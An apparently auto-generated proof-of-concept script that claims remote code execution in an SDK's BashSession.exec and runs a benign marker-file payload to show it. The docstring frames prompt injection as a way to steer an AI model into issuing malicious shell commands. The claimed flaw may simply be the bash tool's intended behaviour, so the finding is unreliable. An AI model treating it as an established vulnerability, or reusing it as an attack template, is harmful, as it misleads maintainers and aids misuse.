#!/usr/bin/env python3
# PoC for anthropic (/tmp/anthropic-sdk-python/src/anthropic)
# Path: rce-002
# Sink: exec
# Auto-generated — run with: python3 rce_bashsession_exec.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for RCE in anthropic SDK's BashSession.exec.

Vulnerability: BashSession.exec (line 342 in agent_toolset.py) writes the user-supplied
`cmd` parameter directly into a persistent bash subprocess without sanitization.
Although the command originates from AI model tool calls, an attacker can use
prompt injection to force the model to issue a malicious command. This PoC
demonstrates direct exploitation by calling BashSession.exec with a benign payload.

This script assumes the anthropic SDK is installed or the source tree is accessible.
It uses the actual BashSession class to execute a harmless command.
"""

import os
import sys
import anyio
# Add the SDK source path to sys.path so we can import the internal module.
# In a real attack, the SDK would be installed; this is for self-contained demonstration.
SDK_PATH = "/tmp/anthropic-sdk-python/src"
if SDK_PATH not in sys.path:
    sys.path.insert(0, SDK_PATH)

from anthropic.lib.tools.agent_toolset import BashSession

# Safe payload: create a marker file in /tmp to confirm code execution.
# Change this to something else (e.g., 'id', 'whoami') for testing.
PAYLOAD = "touch /tmp/poc_success.txt && echo 'EXPLOIT_SUCCESS'"


async def exploit():
    """
    Connect to a persistent bash shell, execute the malicious command, and print output.
    """
    # The BashSession needs a working directory. We'll use /tmp.
    workdir = "/tmp"
    # Start a new persistent bash process.
    print("[*] Starting persistent bash session...")
    session = await BashSession.start(workdir=workdir)
    print(f"[+] Bash session started (PID {session._proc.pid})")

    try:
        # Execute the payload. This is the sink: the command is written directly to stdin.
        print(f"[*] Executing payload: {PAYLOAD}")
        output, exit_code = await session.exec(cmd=PAYLOAD, timeout=10.0)
        print(f"[+] Output:\n{output}")
        print(f"[+] Exit code: {exit_code}")

        # Verify the marker file was created.
        if os.path.exists("/tmp/poc_success.txt"):
            print("[+] SUCCESS: /tmp/poc_success.txt created – arbitrary command execution confirmed.")
        else:
            print("[!] Marker file missing – execution may have failed.")
    except Exception as e:
        print(f"[-] Error during exec: {e}")
    finally:
        # Clean up the persistent shell.
        print("[*] Closing bash session...")
        await session.close()
        print("[+] Session closed.")


def main():
    """
    Entry point – run the async exploit.
    """
    print("=== Anthropic SDK BashSession RCE PoC ===")
    print("Benign payload: " + PAYLOAD)
    print()
    try:
        anyio.run(exploit)
    except KeyboardInterrupt:
        print("\n[-] Interrupted.")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Fatal error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
